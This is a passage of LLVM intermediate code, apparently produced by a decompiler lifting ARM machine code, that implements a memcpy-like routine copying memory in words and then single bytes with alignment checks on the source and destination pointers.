  %v4_153c0 = sub i32 3, %v0_153c0
  %v5_153c0 = and i32 %v4_153c0, %v0_153c0
  %v6_153c0 = icmp slt i32 %v5_153c0, 0
  store i1 %v6_153c0, i1* %cpsr_v.global-to-local, align 1
  %v7_153c0 = icmp slt i32 %v2_153c0, 0
  store i1 %v7_153c0, i1* %cpsr_n.global-to-local, align 1
  %v8_153c0 = icmp eq i32 %v0_153c0, 4
  store i1 %v8_153c0, i1* %cpsr_z.global-to-local, align 1
  %v5_153c4 = icmp slt i32 %v0_153c0, 4
  br i1 %v5_153c4, label %bb140, label %dec_label_pc_153c8

dec_label_pc_153c8:                               ; preds = %bb
  %v1_153c8 = urem i32 %v1_153b0, 4
  store i32 %v1_153c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153c8 = icmp eq i32 %v1_153c8, 0
  store i1 %v2_153c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_153c8, label %dec_label_pc_153d0, label %dec_label_pc_1547c

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153c8
  %v1_153d0 = urem i32 %v0_153b0, 4
  store i32 %v1_153d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_153d0 = icmp eq i32 %v1_153d0, 0
  store i1 %v2_153d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_153b0 to i2
  br i1 %v2_153d0, label %dec_label_pc_153d8, label %dec_label_pc_154ac

dec_label_pc_153d8:                               ; preds = %dec_label_pc_153d0, %dec_label_pc_154a4
  %v0_153f094 = phi i32 [ %v1_153b0, %dec_label_pc_153d0 ], [ %v0_155cc77, %dec_label_pc_154a4 ]
  %v0_153ec93 = phi i32 [ %v0_153b0, %dec_label_pc_153d0 ], [ %v0_154a4, %dec_label_pc_154a4 ]
  %v0_153d8 = phi i32 [ %v2_153c0, %dec_label_pc_153d0 ], [ %v2_1549c, %dec_label_pc_154a4 ]
  %v1_153d8 = add i32 %v0_153d8, -8
  store i32 %v1_153d8, i32* %r2.global-to-local, align 4
  %v3_153d8 = sub i32 7, %v0_153d8
  %v4_153d8 = and i32 %v3_153d8, %v0_153d8
  %v5_153d8 = icmp slt i32 %v4_153d8, 0
  store i1 %v5_153d8, i1* %cpsr_v.global-to-local, align 1
  %v6_153d8 = icmp slt i32 %v1_153d8, 0
  store i1 %v6_153d8, i1* %cpsr_n.global-to-local, align 1
  %v7_153d8 = icmp eq i32 %v0_153d8, 8
  store i1 %v7_153d8, i1* %cpsr_z.global-to-local, align 1
  %v2_153dc = xor i1 %v6_153d8, %v5_153d8
  br i1 %v2_153dc, label %dec_label_pc_1542c, label %dec_label_pc_153e0

dec_label_pc_153e0:                               ; preds = %dec_label_pc_153d8
  %v1_153e0 = add i32 %v0_153d8, -28
  store i32 %v1_153e0, i32* %r2.global-to-local, align 4
  %v3_153e0 = sub i32 27, %v0_153d8
  %v4_153e0 = and i32 %v3_153e0, %v1_153d8
  %v5_153e0 = icmp slt i32 %v4_153e0, 0
  store i1 %v5_153e0, i1* %cpsr_v.global-to-local, align 1
  %v6_153e0 = icmp slt i32 %v1_153e0, 0
  store i1 %v6_153e0, i1* %cpsr_n.global-to-local, align 1
  %v7_153e0 = icmp eq i32 %v1_153d8, 20
  store i1 %v7_153e0, i1* %cpsr_z.global-to-local, align 1
  %v2_153e4 = xor i1 %v6_153e0, %v5_153e0
  br i1 %v2_153e4, label %dec_label_pc_15418, label %dec_label_pc_153e8

dec_label_pc_153e8:                               ; preds = %dec_label_pc_153e0
  %v0_153e8 = load i32, i32* @r4, align 4
  store i32 %v0_153e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_153ec

dec_label_pc_153ec:                               ; preds = %dec_label_pc_153ec.dec_label_pc_153ec_crit_edge, %dec_label_pc_153e8
  %v0_153f0 = phi i32 [ %v12_153f8, %dec_label_pc_153ec.dec_label_pc_153ec_crit_edge ], [ %v0_153f094, %dec_label_pc_153e8 ]
  %v0_153ec = phi i32 [ %v0_153ec.pre, %dec_label_pc_153ec.dec_label_pc_153ec_crit_edge ], [ %v0_153ec93, %dec_label_pc_153e8 ]
  %v1_153ec = inttoptr i32 %v0_153ec to i32*
  %v2_153ec = load i32, i32* %v1_153ec, align 4
  %v3_153ec = add i32 %v0_153ec, 4
  %v4_153ec = inttoptr i32 %v3_153ec to i32*
  %v5_153ec = load i32, i32* %v4_153ec, align 4
  store i32 %v5_153ec, i32* %r4.global-to-local, align 4
  %v6_153ec = add i32 %v0_153ec, 8
  %v7_153ec = inttoptr i32 %v6_153ec to i32*
  %v8_153ec = load i32, i32* %v7_153ec, align 4
  store i32 %v8_153ec, i32* %ip.global-to-local, align 4
  %v9_153ec = add i32 %v0_153ec, 12
  %v10_153ec = inttoptr i32 %v9_153ec to i32*
  %v11_153ec = load i32, i32* %v10_153ec, align 4
  store i32 %v11_153ec, i32* %lr.global-to-local, align 4
  %v12_153ec = add i32 %v0_153ec, 16
  store i32 %v12_153ec, i32* %r1.global-to-local, align 4
  %v1_153f0 = inttoptr i32 %v0_153f0 to i32*
  store i32 %v2_153ec, i32* %v1_153f0, align 4
  %v3_153f0 = add i32 %v0_153f0, 4
  %v4_153f0 = inttoptr i32 %v3_153f0 to i32*
  %v5_153f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_153f0, i32* %v4_153f0, align 4
  %v6_153f0 = add i32 %v0_153f0, 8
  %v7_153f0 = inttoptr i32 %v6_153f0 to i32*
  %v8_153f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_153f0, i32* %v7_153f0, align 4
  %v9_153f0 = add i32 %v0_153f0, 12
  %v10_153f0 = inttoptr i32 %v9_153f0 to i32*
  %v11_153f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_153f0, i32* %v10_153f0, align 4
  %v12_153f0 = add i32 %v0_153f0, 16
  store i32 %v12_153f0, i32* %r0.global-to-local, align 4
  %v0_153f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_153f4 = inttoptr i32 %v0_153f4 to i32*
  %v2_153f4 = load i32, i32* %v1_153f4, align 4
  store i32 %v2_153f4, i32* @r3, align 4
  %v3_153f4 = add i32 %v0_153f4, 4
  %v4_153f4 = inttoptr i32 %v3_153f4 to i32*
  %v5_153f4 = load i32, i32* %v4_153f4, align 4
  store i32 %v5_153f4, i32* %r4.global-to-local, align 4
  %v6_153f4 = add i32 %v0_153f4, 8
  %v7_153f4 = inttoptr i32 %v6_153f4 to i32*
  %v8_153f4 = load i32, i32* %v7_153f4, align 4
  store i32 %v8_153f4, i32* @ip, align 4
  %v9_153f4 = add i32 %v0_153f4, 12
  %v10_153f4 = inttoptr i32 %v9_153f4 to i32*
  %v11_153f4 = load i32, i32* %v10_153f4, align 4
  store i32 %v11_153f4, i32* %lr.global-to-local, align 4
  %v12_153f4 = add i32 %v0_153f4, 16
  store i32 %v12_153f4, i32* @r1, align 4
  %v1_153f8 = inttoptr i32 %v12_153f0 to i32*
  store i32 %v2_153f4, i32* %v1_153f8, align 4
  %v3_153f8 = add i32 %v0_153f0, 20
  %v4_153f8 = inttoptr i32 %v3_153f8 to i32*
  %v5_153f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_153f8, i32* %v4_153f8, align 4
  %v6_153f8 = add i32 %v0_153f0, 24
  %v7_153f8 = inttoptr i32 %v6_153f8 to i32*
  %v8_153f8 = load i32, i32* @ip, align 4
  store i32 %v8_153f8, i32* %v7_153f8, align 4
  %v9_153f8 = add i32 %v0_153f0, 28
  %v10_153f8 = inttoptr i32 %v9_153f8 to i32*
  %v11_153f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_153f8, i32* %v10_153f8, align 4
  %v12_153f8 = add i32 %v0_153f0, 32
  store i32 %v12_153f8, i32* @r0, align 4
  %v0_153fc = load i32, i32* %r2.global-to-local, align 4
  %v1_153fc = add i32 %v0_153fc, -32
  store i32 %v1_153fc, i32* %r2.global-to-local, align 4
  %v3_153fc = sub i32 31, %v0_153fc
  %v4_153fc = and i32 %v3_153fc, %v0_153fc
  %v5_153fc = icmp slt i32 %v4_153fc, 0
  %v6_153fc = icmp slt i32 %v1_153fc, 0
  %v2_15400 = xor i1 %v6_153fc, %v5_153fc
  br i1 %v2_15400, label %dec_label_pc_15404, label %dec_label_pc_153ec.dec_label_pc_153ec_crit_edge

dec_label_pc_153ec.dec_label_pc_153ec_crit_edge:  ; preds = %dec_label_pc_153ec
  %v0_153ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_153ec

dec_label_pc_15404:                               ; preds = %dec_label_pc_153ec
  %v1_15404 = add i32 %v0_153fc, -16
  %v3_15404 = add i32 %v0_153fc, 2147483616
  %v4_15404 = and i32 %v1_15404, %v3_15404
  %v5_15404 = icmp slt i32 %v4_15404, 0
  store i1 %v5_15404, i1* %cpsr_v.global-to-local, align 1
  %v6_15404 = icmp slt i32 %v1_15404, 0
  store i1 %v6_15404, i1* %cpsr_n.global-to-local, align 1
  %v7_15404 = icmp eq i32 %v1_15404, 0
  store i1 %v7_15404, i1* %cpsr_z.global-to-local, align 1
  %v2_15408 = xor i1 %v6_15404, %v5_15404
  br i1 %v2_15408, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_15404
  %v3_15408 = load i32, i32* @r1, align 4
  %v4_15408 = inttoptr i32 %v3_15408 to i32*
  %v5_15408 = load i32, i32* %v4_15408, align 4
  store i32 %v5_15408, i32* @r3, align 4
  %v6_15408 = add i32 %v3_15408, 4
  %v7_15408 = inttoptr i32 %v6_15408 to i32*
  %v8_15408 = load i32, i32* %v7_15408, align 4
  store i32 %v8_15408, i32* %r4.global-to-local, align 4
  %v9_15408 = add i32 %v3_15408, 8
  %v10_15408 = inttoptr i32 %v9_15408 to i32*
  %v11_15408 = load i32, i32* %v10_15408, align 4
  store i32 %v11_15408, i32* @ip, align 4
  %v12_15408 = add i32 %v3_15408, 12
  %v13_15408 = inttoptr i32 %v12_15408 to i32*
  %v14_15408 = load i32, i32* %v13_15408, align 4
  store i32 %v14_15408, i32* %lr.global-to-local, align 4
  %v15_15408 = add i32 %v3_15408, 16
  store i32 %v15_15408, i32* @r1, align 4
  %v4_1540c = inttoptr i32 %v12_153f8 to i32*
  store i32 %v5_15408, i32* %v4_1540c, align 4
  %v6_1540c = add i32 %v0_153f0, 36
  %v7_1540c = inttoptr i32 %v6_1540c to i32*
  %v8_1540c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1540c, i32* %v7_1540c, align 4
  %v9_1540c = add i32 %v0_153f0, 40
  %v10_1540c = inttoptr i32 %v9_1540c to i32*
  %v11_1540c = load i32, i32* @ip, align 4
  store i32 %v11_1540c, i32* %v10_1540c, align 4
  %v12_1540c = add i32 %v0_153f0, 44
  %v13_1540c = inttoptr i32 %v12_1540c to i32*
  %v14_1540c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1540c, i32* %v13_1540c, align 4
  %v15_1540c = add i32 %v0_153f0, 48
  store i32 %v15_1540c, i32* @r0, align 4
  %v3_15410 = load i32, i32* %r2.global-to-local, align 4
  %v4_15410 = add i32 %v3_15410, -16
  store i32 %v4_15410, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_15404, %bb136
  %v3_15420102111 = phi i32 [ %v15_1540c, %bb136 ], [ %v12_153f8, %dec_label_pc_15404 ]
  %v0_15418.pre = phi i32 [ %v4_15410, %bb136 ], [ %v1_153fc, %dec_label_pc_15404 ]
  %v2_15414 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15414, i32* @r4, align 4
  br label %dec_label_pc_15418

dec_label_pc_15418:                               ; preds = %dec_label_pc_153e0, %bb137
  %v3_15420101 = phi i32 [ %v0_153f094, %dec_label_pc_153e0 ], [ %v3_15420102111, %bb137 ]
  %v0_15418 = phi i32 [ %v1_153e0, %dec_label_pc_153e0 ], [ %v0_15418.pre, %bb137 ]
  %v1_15418 = add i32 %v0_15418, 20
  store i32 %v1_15418, i32* %r2.global-to-local, align 4
  %v3_15418 = sub i32 0, %v0_15418
  %v4_15418 = and i32 %v1_15418, %v3_15418
  %v5_15418 = icmp slt i32 %v4_15418, 0
  store i1 %v5_15418, i1* %cpsr_v.global-to-local, align 1
  %v6_15418 = icmp slt i32 %v1_15418, 0
  store i1 %v6_15418, i1* %cpsr_n.global-to-local, align 1
  %v7_15418 = icmp eq i32 %v1_15418, 0
  store i1 %v7_15418, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1541c

dec_label_pc_1541c:                               ; preds = %.thread115, %dec_label_pc_15418
  %v0_1542c.pre157 = phi i32 [ %v0_1542c.pre, %.thread115 ], [ %v1_15418, %dec_label_pc_15418 ]
  %v3_15420 = phi i32 [ %v3_1542099116, %.thread115 ], [ %v3_15420101, %dec_label_pc_15418 ]
  %v1_15424 = phi i1 [ %v1_15428, %.thread115 ], [ %v5_15418, %dec_label_pc_15418 ]
  %v0_15424 = phi i1 [ %v0_15428, %.thread115 ], [ %v6_15418, %dec_label_pc_15418 ]
  %v2_1541c = xor i1 %v1_15424, %v0_15424
  br i1 %v2_1541c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1541c
  %v3_1541c = load i32, i32* @r1, align 4
  %v4_1541c = inttoptr i32 %v3_1541c to i32*
  %v5_1541c = load i32, i32* %v4_1541c, align 4
  store i32 %v5_1541c, i32* @r3, align 4
  %v6_1541c = add i32 %v3_1541c, 4
  %v7_1541c = inttoptr i32 %v6_1541c to i32*
  %v8_1541c = load i32, i32* %v7_1541c, align 4
  store i32 %v8_1541c, i32* @ip, align 4
  %v9_1541c = add i32 %v3_1541c, 8
  %v10_1541c = inttoptr i32 %v9_1541c to i32*
  %v11_1541c = load i32, i32* %v10_1541c, align 4
  store i32 %v11_1541c, i32* %lr.global-to-local, align 4
  %v12_1541c = add i32 %v3_1541c, 12
  store i32 %v12_1541c, i32* @r1, align 4
  %v4_15420 = inttoptr i32 %v3_15420 to i32*
  store i32 %v5_1541c, i32* %v4_15420, align 4
  %v6_15420 = add i32 %v3_15420, 4
  %v7_15420 = inttoptr i32 %v6_15420 to i32*
  %v8_15420 = load i32, i32* @ip, align 4
  store i32 %v8_15420, i32* %v7_15420, align 4
  %v9_15420 = add i32 %v3_15420, 8
  %v10_15420 = inttoptr i32 %v9_15420 to i32*
  %v11_15420 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_15420, i32* %v10_15420, align 4
  %v12_15420 = add i32 %v3_15420, 12
  store i32 %v12_15420, i32* @r0, align 4
  %v3_15424 = load i32, i32* %r2.global-to-local, align 4
  %v4_15424 = add i32 %v3_15424, -12
  store i32 %v4_15424, i32* %r2.global-to-local, align 4
  %v6_15424 = sub i32 11, %v3_15424
  %v7_15424 = and i32 %v6_15424, %v3_15424
  %v8_15424 = icmp slt i32 %v7_15424, 0
  store i1 %v8_15424, i1* %cpsr_v.global-to-local, align 1
  %v9_15424 = icmp slt i32 %v4_15424, 0
  store i1 %v9_15424, i1* %cpsr_n.global-to-local, align 1
  %v10_15424 = icmp eq i32 %v3_15424, 12
  store i1 %v10_15424, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1541c, %bb138
  %v0_1542c.pre = phi i32 [ %v4_15424, %bb138 ], [ %v0_1542c.pre157, %dec_label_pc_1541c ]
  %v3_1542099116 = phi i32 [ %v12_15420, %bb138 ], [ %v3_15420, %dec_label_pc_1541c ]
  %v1_15428 = phi i1 [ %v8_15424, %bb138 ], [ %v1_15424, %dec_label_pc_1541c ]
  %v0_15428 = phi i1 [ %v9_15424, %bb138 ], [ %v0_15424, %dec_label_pc_1541c ]
  %v2_15428 = xor i1 %v1_15428, %v0_15428
  br i1 %v2_15428, label %dec_label_pc_1542c, label %dec_label_pc_1541c

dec_label_pc_1542c:                               ; preds = %.thread115, %dec_label_pc_153d8
  %v4_1543c = phi i32 [ %v0_153f094, %dec_label_pc_153d8 ], [ %v3_1542099116, %.thread115 ]
  %v0_1542c = phi i32 [ %v1_153d8, %dec_label_pc_153d8 ], [ %v0_1542c.pre, %.thread115 ]
  %v1_1542c = add i32 %v0_1542c, 8
  store i32 %v1_1542c, i32* %r2.global-to-local, align 4
  %v3_1542c = sub i32 0, %v0_1542c
  %v4_1542c = and i32 %v1_1542c, %v3_1542c
  %v5_1542c = icmp slt i32 %v4_1542c, 0
  store i1 %v5_1542c, i1* %cpsr_v.global-to-local, align 1
  %v6_1542c = icmp slt i32 %v1_1542c, 0
  store i1 %v6_1542c, i1* %cpsr_n.global-to-local, align 1
  %v7_1542c = icmp eq i32 %v1_1542c, 0
  store i1 %v7_1542c, i1* %cpsr_z.global-to-local, align 1
  %v2_15430 = xor i1 %v6_1542c, %v5_1542c
  br i1 %v2_15430, label %bb140, label %dec_label_pc_15434

dec_label_pc_15434:                               ; preds = %dec_label_pc_1542c
  %v1_15434 = add i32 %v0_1542c, 4
  store i32 %v1_15434, i32* %r2.global-to-local, align 4
  %v3_15434 = sub i32 -5, %v0_1542c
  %v4_15434 = and i32 %v3_15434, %v1_1542c
  %v5_15434 = icmp slt i32 %v4_15434, 0
  store i1 %v5_15434, i1* %cpsr_v.global-to-local, align 1
  %v6_15434 = icmp slt i32 %v1_15434, 0
  store i1 %v6_15434, i1* %cpsr_n.global-to-local, align 1
  %v7_15434 = icmp eq i32 %v1_1542c, 4
  store i1 %v7_15434, i1* %cpsr_z.global-to-local, align 1
  %v2_15438 = xor i1 %v6_15434, %v5_15434
  %v3_15438 = load i32, i32* @r1, align 4
  %v4_15438 = inttoptr i32 %v3_15438 to i32*
  %v5_15438 = load i32, i32* %v4_15438, align 4
  store i32 %v5_15438, i32* @r3, align 4
  %v7_15438 = add i32 %v3_15438, 4
  br i1 %v2_15438, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_15434
  store i32 %v7_15438, i32* @r1, align 4
  %v5_1543c = inttoptr i32 %v4_1543c to i32*
  store i32 %v5_15438, i32* %v5_1543c, align 4
  %v6_1543c = load i32, i32* @r0, align 4
  %v7_1543c = add i32 %v6_1543c, 4
  store i32 %v7_1543c, i32* @r0, align 4
  %v0_1544c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_15434
  %v7_15440 = inttoptr i32 %v7_15438 to i32*
  %v8_15440 = load i32, i32* %v7_15440, align 4
  store i32 %v8_15440, i32* @ip, align 4
  %v9_15440 = add i32 %v3_15438, 8
  store i32 %v9_15440, i32* @r1, align 4
  %v4_15444 = inttoptr i32 %v4_1543c to i32*
  store i32 %v5_15438, i32* %v4_15444, align 4
  %v6_15444 = add i32 %v4_1543c, 4
  %v7_15444 = inttoptr i32 %v6_15444 to i32*
  %v8_15444 = load i32, i32* @ip, align 4
  store i32 %v8_15444, i32* %v7_15444, align 4
  %v9_15444 = add i32 %v4_1543c, 8
  store i32 %v9_15444, i32* @r0, align 4
  %v3_15448 = load i32, i32* %r2.global-to-local, align 4
  %v4_15448 = add i32 %v3_15448, -4
  store i32 %v4_15448, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1542c, %bb, %dec_label_pc_155fc, %dec_label_pc_15590, %dec_label_pc_15524, %bb139
  %v0_1544c = phi i32 [ %v0_1544c.pre, %.thread122 ], [ %v2_1549c, %.thread128 ], [ %v1_1542c, %dec_label_pc_1542c ], [ %v2_153c0, %bb ], [ %v0_1544c61, %dec_label_pc_155fc ], [ %v0_1544c60, %dec_label_pc_15590 ], [ %v0_1544c59, %dec_label_pc_15524 ], [ %v4_15448, %bb139 ]
  %v1_1544c = add i32 %v0_1544c, 4
  store i32 %v1_1544c, i32* %r2.global-to-local, align 4
  %v3_1544c = sub i32 0, %v0_1544c
  %v4_1544c = and i32 %v1_1544c, %v3_1544c
  %v5_1544c = icmp slt i32 %v4_1544c, 0
  store i1 %v5_1544c, i1* %cpsr_v.global-to-local, align 1
  %v6_1544c = icmp slt i32 %v1_1544c, 0
  store i1 %v6_1544c, i1* %cpsr_n.global-to-local, align 1
  %v7_1544c = icmp eq i32 %v1_1544c, 0
  store i1 %v7_1544c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1544c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15454.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15450 = load i8*, i8** %stack_var_-8, align 4
  %v4_15450 = ptrtoint i8* %v3_15450 to i32
  store i32 %v4_15450, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15454 = phi i32 [ %v0_15454.pre, %bb140.bb142_crit_edge ], [ %v8_153bc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1544c, i32 %v0_15454)
  %v0_15458 = load i32, i32* %r2.global-to-local, align 4
  %v1_15458 = add i32 %v0_15458, -2
  %v3_15458 = sub i32 1, %v0_15458
  %v4_15458 = and i32 %v3_15458, %v0_15458
  %v5_15458 = icmp slt i32 %v4_15458, 0
  store i1 %v5_15458, i1* %cpsr_v.global-to-local, align 1
  %v6_15458 = icmp slt i32 %v1_15458, 0
  store i1 %v6_15458, i1* %cpsr_n.global-to-local, align 1
  %v7_15458 = icmp eq i32 %v0_15458, 2
  store i1 %v7_15458, i1* %cpsr_z.global-to-local, align 1
  %v0_1545c = load i32, i32* @r1, align 4
  %v1_1545c = inttoptr i32 %v0_1545c to i8*
  %v2_1545c = load i8, i8* %v1_1545c, align 1
  %v5_1545c = add i32 %v0_1545c, 1
  store i32 %v5_1545c, i32* %r1.global-to-local, align 4
  %v2_15460 = load i32, i32* @r0, align 4
  %v3_15460 = inttoptr i32 %v2_15460 to i8*
  store i8 %v2_1545c, i8* %v3_15460, align 1
  %v4_15460 = load i32, i32* @r0, align 4
  %v5_15460 = add i32 %v4_15460, 1
  store i32 %v5_15460, i32* %r0.global-to-local, align 4
  %v0_15464 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15464 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15464 = xor i1 %v0_15464, %v1_15464
  br i1 %v2_15464, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15464 = load i32, i32* %r1.global-to-local, align 4
  %v4_15464 = inttoptr i32 %v3_15464 to i8*
  %v5_15464 = load i8, i8* %v4_15464, align 1
  %v8_15464 = add i32 %v3_15464, 1
  store i32 %v8_15464, i32* %r1.global-to-local, align 4
  %v6_15468 = inttoptr i32 %v5_15460 to i8*
  store i8 %v5_15464, i8* %v6_15468, align 1
  %v7_15468 = load i32, i32* %r0.global-to-local, align 4
  %v8_15468 = add i32 %v7_15468, 1
  store i32 %v8_15468, i32* %r0.global-to-local, align 4
  %v1_1546c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1546c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15470 = phi i32 [ %v8_15468, %bb143 ], [ %v5_15460, %bb142 ]
  %v2_15470 = phi i1 [ %v2_1546c.pre, %bb143 ], [ %v1_15464, %bb142 ]
  %v1_15470 = phi i1 [ %v1_1546c.pre, %bb143 ], [ %v0_15464, %bb142 ]
  %v0_1546c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1546c = xor i1 %v2_15470, %v1_15470
  %v4_1546c = or i1 %v0_1546c, %v3_1546c
  br i1 %v4_1546c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1546c = load i32, i32* %r1.global-to-local, align 4
  %v6_1546c = inttoptr i32 %v5_1546c to i8*
  %v7_1546c = load i8, i8* %v6_1546c, align 1
  %v10_1546c = add i32 %v5_1546c, 1
  store i32 %v10_1546c, i32* %r1.global-to-local, align 4
  %v8_15470 = inttoptr i32 %v7_15470 to i8*
  store i8 %v7_1546c, i8* %v8_15470, align 1
  %v9_15470 = load i32, i32* %r0.global-to-local, align 4
  %v10_15470 = add i32 %v9_15470, 1
  store i32 %v10_15470, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_15474 = load i8*, i8** %stack_var_-8, align 4
  %v3_15474 = ptrtoint i8* %v2_15474 to i32
  store i32 %v3_15474, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_153bc)
  %v0_1547c.pre = load i32, i32* @ip, align 4
  %v0_15484.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15488.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_153c8, %.thread126
  %v2_15488 = phi i32 [ %v1_153b0, %dec_label_pc_153c8 ], [ %v2_15488.pre, %.thread126 ]
  %v0_15484 = phi i32 [ %v0_153b0, %dec_label_pc_153c8 ], [ %v0_15484.pre, %.thread126 ]
  %v0_1547c = phi i32 [ %v1_153c8, %dec_label_pc_153c8 ], [ %v0_1547c.pre, %.thread126 ]
  %v1_1547c = sub i32 4, %v0_1547c
  store i32 %v1_1547c, i32* @ip, align 4
  %v1_15480 = add i32 %v1_1547c, -2
  %v3_15480 = sub i32 1, %v1_1547c
  %v4_15480 = and i32 %v3_15480, %v1_1547c
  %v5_15480 = icmp slt i32 %v4_15480, 0
  store i1 %v5_15480, i1* %cpsr_v.global-to-local, align 1
  %v6_15480 = icmp slt i32 %v1_15480, 0
  store i1 %v6_15480, i1* %cpsr_n.global-to-local, align 1
  %v7_15480 = icmp eq i32 %v1_1547c, 2
  store i1 %v7_15480, i1* %cpsr_z.global-to-local, align 1
  %v1_15484 = inttoptr i32 %v0_15484 to i8*
  %v2_15484 = load i8, i8* %v1_15484, align 1
  %v3_15484 = zext i8 %v2_15484 to i32
  store i32 %v3_15484, i32* @r3, align 4
  %v5_15484 = add i32 %v0_15484, 1
  store i32 %v5_15484, i32* @r1, align 4
  %v3_15488 = inttoptr i32 %v2_15488 to i8*
  store i8 %v2_15484, i8* %v3_15488, align 1
  %v4_15488 = load i32, i32* @r0, align 4
  %v5_15488 = add i32 %v4_15488, 1
  store i32 %v5_15488, i32* @r0, align 4
  %v0_1548c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1548c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1548c = xor i1 %v0_1548c, %v1_1548c
  br i1 %v2_1548c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1547c
  %v3_1548c = load i32, i32* @r1, align 4
  %v4_1548c = inttoptr i32 %v3_1548c to i8*
  %v5_1548c = load i8, i8* %v4_1548c, align 1
  %v6_1548c = zext i8 %v5_1548c to i32
  store i32 %v6_1548c, i32* @r3, align 4
  %v8_1548c = add i32 %v3_1548c, 1
  store i32 %v8_1548c, i32* @r1, align 4
  %v6_15490 = inttoptr i32 %v5_15488 to i8*
  store i8 %v5_1548c, i8* %v6_15490, align 1
  %v7_15490 = load i32, i32* @r0, align 4
  %v8_15490 = add i32 %v7_15490, 1
  store i32 %v8_15490, i32* @r0, align 4
  %v1_15494.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15494.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1547c, %bb145
  %v7_15498 = phi i32 [ %v8_15490, %bb145 ], [ %v5_15488, %dec_label_pc_1547c ]
  %v2_15498 = phi i1 [ %v2_15494.pre, %bb145 ], [ %v1_1548c, %dec_label_pc_1547c ]
  %v1_15498 = phi i1 [ %v1_15494.pre, %bb145 ], [ %v0_1548c, %dec_label_pc_1547c ]
  %v0_15494 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15494 = xor i1 %v2_15498, %v1_15498
  %v4_15494 = or i1 %v0_15494, %v3_15494
  br i1 %v4_15494, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15494 = load i32, i32* @r1, align 4
  %v6_15494 = inttoptr i32 %v5_15494 to i8*
  %v7_15494 = load i8, i8* %v6_15494, align 1
  %v8_15494 = zext i8 %v7_15494 to i32
  store i32 %v8_15494, i32* @r3, align 4
  %v10_15494 = add i32 %v5_15494, 1
  store i32 %v10_15494, i32* @r1, align 4
  %v8_15498 = inttoptr i32 %v7_15498 to i8*
  store i8 %v7_15494, i8* %v8_15498, align 1
  %v9_15498 = load i32, i32* @r0, align 4
  %v10_15498 = add i32 %v9_15498, 1
  store i32 %v10_15498, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_155cc77 = phi i32 [ %v10_15498, %bb146 ], [ %v7_15498, %.thread127 ]
  %v0_1549c = load i32, i32* %r2.global-to-local, align 4
  %v1_1549c = load i32, i32* @ip, align 4
  %v2_1549c = sub i32 %v0_1549c, %v1_1549c
  store i32 %v2_1549c, i32* %r2.global-to-local, align 4
  %v4_1549c = xor i32 %v1_1549c, %v0_1549c
  %v5_1549c = xor i32 %v2_1549c, %v0_1549c
  %v6_1549c = and i32 %v5_1549c, %v4_1549c
  %v7_1549c = icmp slt i32 %v6_1549c, 0
  store i1 %v7_1549c, i1* %cpsr_v.global-to-local, align 1
  %v8_1549c = icmp slt i32 %v2_1549c, 0
  store i1 %v8_1549c, i1* %cpsr_n.global-to-local, align 1
  %v9_1549c = icmp eq i32 %v0_1549c, %v1_1549c
  store i1 %v9_1549c, i1* %cpsr_z.global-to-local, align 1
  %v2_154a0 = xor i1 %v8_1549c, %v7_1549c
  br i1 %v2_154a0, label %bb140, label %dec_label_pc_154a4

